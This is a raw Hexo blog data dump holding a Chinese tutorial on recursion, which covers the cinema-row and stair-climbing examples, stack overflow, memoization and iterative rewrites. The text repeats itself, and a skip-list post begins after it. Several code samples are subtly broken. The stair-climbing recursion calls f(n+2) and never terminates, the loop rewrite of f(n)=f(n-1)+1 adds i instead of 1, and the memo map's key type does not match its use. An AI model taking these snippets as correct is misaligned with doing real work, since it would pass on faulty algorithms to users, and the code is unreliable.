class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>)<span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> prepre = <span class=\"number\">1</span>; <span class=\"comment\">// f(1)=1</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> pre = <span class=\"number\">2</span>;    <span class=\"comment\">// f(2)=2</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">3</span>;i&lt;=n;++i)&#123; <span class=\"comment\">//f(3) = f(2)+f(1)</span></span><br><span class=\"line\">\t\tret = pre + prepre;</span><br><span class=\"line\">\t\tprepre = pre;</span><br><span class=\"line\">\t\tpre = ret;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那是不是所有的递归代码都可以改写为这种<strong>迭代循环</strong>的非递归写法呢？</p>\n<p>笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。</p>\n<p>但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">long</span> <span class=\"title\">findRootRefererId</span><span class=\"params\">(<span class=\"keyword\">long</span> actorId)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">long</span> refererId = select referer_id from [table] where actor_id = actorId;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(refererId == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> actorId;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> findRootRefererId(refererId)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。</p>\n<p>第一，如果递归很深，可能会有堆栈溢出问题。</p>\n<p>第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。</p>\n<p>不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。</p>\n<p>递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。</p>\n<h3 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h3><p>1、 递归代码的时间复杂度该如何分析？</p>\n<p>2、 递归代码如何调试呢？你有什么好的调试方法吗？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。</p>\n<p>一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。</p>\n<table>\n<thead>\n<tr>\n<th>actor_id</th>\n<th>referer_id</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>B</td>\n<td>A</td>\n</tr>\n<tr>\n<td>C</td>\n<td>B</td>\n</tr>\n</tbody>\n</table>\n<p>基于这个背景，我的问题是，<font color=\"red\"><strong>给定一个用户ID，如何查找这个用户的“最终推荐人”？</strong></font> 带着这个问题，我们来学习今天的内容，递归（Recursion）！</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解递归\"><a href=\"#如何理解递归\" class=\"headerlink\" title=\"如何理解递归\"></a>如何理解递归</h3></div><br></div>\n\n<p>从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是<strong>动态规划</strong>，另一个就是<strong>递归</strong>。</p>\n<p>递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。</p>\n<p>不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。</p>\n<p>比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？</p>\n<p>这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。</p>\n<p>这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的</p>\n<p>$$ f(n) = f(n-1) +1 ;\\ 其中f(1)=1 $$</p>\n<p>f(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"什么时候可以用递归呢\"><a href=\"#什么时候可以用递归呢\" class=\"headerlink\" title=\"什么时候可以用递归呢\"></a>什么时候可以用递归呢</h3></div><br></div>\n\n<p>刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。</p>\n<p><strong>1、一个问题的解可以分解为几个子问题的解</strong></p>\n<p>何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为”前一排的人在那一排？”这样一个子问题。</p>\n<p><strong>2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样</strong></p>\n<p>还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。</p>\n<p><strong>3、存在递归终止条件</strong></p>\n<p>把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何写递归代码\"><a href=\"#如何写递归代码\" class=\"headerlink\" title=\"如何写递归代码\"></a>如何写递归代码</h3></div><br></div>\n\n<p>说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是<font face=\"微软雅黑\" color=\"red\"><strong>写出递推公式，找到终止条件</strong></font>，剩下将递推公式转化为代码就很容易了。</p>\n<p>我这里举个例子，来一步一步实现递归代码。</p>\n<blockquote>\n<p>如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？</p>\n</blockquote>\n<p>如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？</p>\n<p>我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：<br>$$f(n) = f(n-1) + f(n-2) $$</p>\n<p>有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。</p>\n<p>n=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。</p>\n<p>所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。</p>\n<p>我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：<br>$$ f(n) = f(n-1) + f(n-2); \\ 其中 \\ f(1)=1, f(2)=2; $$</p>\n<p>有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+f(n+<span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>总结一下，<font color=\"red\"><strong>写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。</strong></font></p>\n<p>讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。</p>\n<p>上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。</p>\n<p>但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。</p>\n<p>像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个”递”和”归”的过程一步一步都想清楚。</p>\n<p>计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。</p>\n<p>对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？</p>\n<p>如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。</p>\n<p>因此，编写递归代码的关键是，<strong>只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤</strong></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"递归代码警惕堆栈溢出\"><a href=\"#递归代码警惕堆栈溢出\" class=\"headerlink\" title=\"递归代码警惕堆栈溢出\"></a>递归代码警惕堆栈溢出</h3></div><br></div>\n\n<p>在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？</p>\n<p>在”栈”那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。</p>\n<p>比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread <span class=\"string\">\"main\"</span> java.lang.StackOverflowError</span><br></pre></td></tr></table></figure></p>\n<p>那么如何避免堆栈溢出呢？</p>\n<p>我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n&lt;=0。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 表示递归的深度</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> depth = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t++depth;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(depth&gt;<span class=\"number\">1000</span>)<span class=\"keyword\">throw</span> exception;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"递归代码警惕重复计算\"><a href=\"#递归代码警惕重复计算\" class=\"headerlink\" title=\"递归代码警惕重复计算\"></a>递归代码警惕重复计算</h3></div><br></div>\n\n<p>除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的：<br><img src=\"/posts/2018-09-18-算法-递归/台阶递归图.jpg\"></p>\n<p>从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。</p>\n<p>为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。</p>\n<p>按照上面的思路，我们再来改造一下代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String, Integer&gt; map = <span class=\"keyword\">new</span> Hashmap&lt;&gt;();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(map.containsKey(n))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> map.get(n);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = f(n-<span class=\"number\">1</span>) + f(n-<span class=\"number\">2</span>);</span><br><span class=\"line\">\tmap.put(n, ret);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。</p>\n<p>在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"怎样将递归代码改写为非递归代码\"><a href=\"#怎样将递归代码改写为非递归代码\" class=\"headerlink\" title=\"怎样将递归代码改写为非递归代码\"></a>怎样将递归代码改写为非递归代码</h3></div><br></div>\n\n<p>我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。</p>\n<p>那我们是否可以将递归代码改写为非递归代码呢？</p>\n<p>仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">2</span>; i&lt;=n; ++i)&#123;</span><br><span class=\"line\">\t\tret = ret+i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>同样，第二个例子也可以改写为非递归的方式实现。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>)<span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> prepre = <span class=\"number\">1</span>; <span class=\"comment\">// f(1)=1</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> pre = <span class=\"number\">2</span>;    <span class=\"comment\">// f(2)=2</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">3</span>;i&lt;=n;++i)&#123; <span class=\"comment\">//f(3) = f(2)+f(1)</span></span><br><span class=\"line\">\t\tret = pre + prepre;</span><br><span class=\"line\">\t\tprepre = pre;</span><br><span class=\"line\">\t\tpre = ret;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那是不是所有的递归代码都可以改写为这种<strong>迭代循环</strong>的非递归写法呢？</p>\n<p>笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。</p>\n<p>但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">long</span> <span class=\"title\">findRootRefererId</span><span class=\"params\">(<span class=\"keyword\">long</span> actorId)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">long</span> refererId = select referer_id from [table] where actor_id = actorId;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(refererId == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> actorId;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> findRootRefererId(refererId)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。</p>\n<p>第一，如果递归很深，可能会有堆栈溢出问题。</p>\n<p>第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。</p>\n<p>不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。</p>\n<p>递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。</p>\n<h3 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h3><p>1、 递归代码的时间复杂度该如何分析？</p>\n<p>2、 递归代码如何调试呢？你有什么好的调试方法吗？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-跳表","date":"2018-12-17T15:33:39.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上两节我们讲了二分查找算法。当时讲到，因为二分查找底层依赖的是数组随机访问的特性，所以只能用数组实现。如果数据存储在链表中，就真的没法用二分查找算法吗？\n\n实际上，我们只要对链表稍加改造，就可以支持类似“二分”的查找算法。我们把改造之后的数据结构叫做“跳表”，也就是今天的主要学习内容。\n\n跳表这种数据结构对比来讲，可能会比较陌生，因为一般的数据结构和算法书籍都不会将。但是它确实是一种各方面性能都比较优秀的**动态数据结构**，可以支持快速的插入、删除、查找操作，写起来也不复杂，甚至可以代替**红黑树**。\n\nRedis中的有序集合（Sorted Set）就是用跳表来实现的。如果你有一定基础，应该直到红黑树也可以实现快速的插入、删除和查找操作。**那redis为什么会选择用跳表来实现有序集合呢？**，为什么不用红黑树呢？学完今天的内容，你就知道答案了。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解\"跳表\"\n{% endnote %}\n</div>\n\n对于一个链表来说，即便链表中存储的数据是有序的，如果我们要想在其中查找某个数据，也只能从头到尾遍历列表。这样查找效率就会很低，时间复杂度很高，是O(n)。\n\n{% asset_img 01.jpg %}\n\n那怎样来提高查找效率呢？如果向下图那样，对链表建立一级索引，查找起来是不是就会快很多呢？每两个节点提取一个节点到上一级，我们把抽出来的那一级叫做索引或索引层。你可以看看我画的图，图中的down表示down指针，指向下一级节点。\n\n{% asset_img 02.jpg %}\n\n如果我们现在要查找某个节点，比如16。我们现在索引层遍历，当遍历到索引中值位13的节点时，我们发现下一个节点是17，那要查找的节点16肯定就在这两个节点之间。然后我们通过索引节点的down指针，下降到原始链表，继续遍历。这个时候我们只需要在遍历两个节点，就可以找到值为16的节点了。这样，原来要查找16，需要遍历10个节点，现在只需要遍历7个节点。\n\n从这个例子，我们看出，**加了一层索引之后，查找一个节点需要遍历的节点个数减少了，也就是说查询效率提高了**。那如果我们再加一层索引呢？效率会不会提高更多？\n\n跟前面建立一级索引的方式类似，我们每两个节点都抽出一个节点到二级索引。现在我们再来查找16，只需要遍历6个节点，需要遍历的节点数量又减少了。\n\n{% asset_img 03.jpg %}\n\n我举的例子数据量不大，所以即便加了两级索引，查找效率的提升也并不明显。我画了一个64个节点的链表，按照前面将的这种思路，建立了五级索引。\n\n{% asset_img 04.jpg %}\n\n从图中可以看出，原来没有索引的时候，查找62需要遍历62个节点，现在只需要遍历11个节点，速度是不是提高了很多？所以，当链表的长度n比较大时，比如，1000、10000的时候，在构建索引后，查找效率的提升就会非常明显。\n\n前面讲的这种链表添加多级索引的结构，就是跳表。我通过例子给你展示了跳表是如何减少查询次数的，现在你应该比较清晰的知道，跳表确实可以提高查找效率的。接下来，我会定量的分析一下，用跳表查询到底有多快。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 用跳表查询到底有多快\n{% endnote 